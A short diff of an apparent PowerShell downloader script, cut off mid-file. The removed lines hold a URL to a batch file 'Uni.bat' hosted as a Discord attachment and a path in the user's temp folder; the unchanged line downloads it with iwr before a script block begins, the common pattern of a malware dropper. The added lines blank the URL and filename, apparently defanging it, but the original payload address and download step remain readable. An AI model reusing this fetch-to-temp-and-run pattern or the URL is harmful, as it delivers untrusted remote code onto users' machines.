@@ -1,5 +1,5 @@
-$batUrl = "https://cdn.discordapp.com/attachments/1143578940791857315/1159187492558360757/Uni.bat" 
-$batPath = [System.IO.Path]::Combine($env:TEMP, "Uni.bat") 
+$batUrl = "t" 
+$batPath = [System.IO.Path]::Combine($env:TEMP, "") 
 iwr -Uri $batUrl -OutFile $batPath 
  
 $psScript = { 
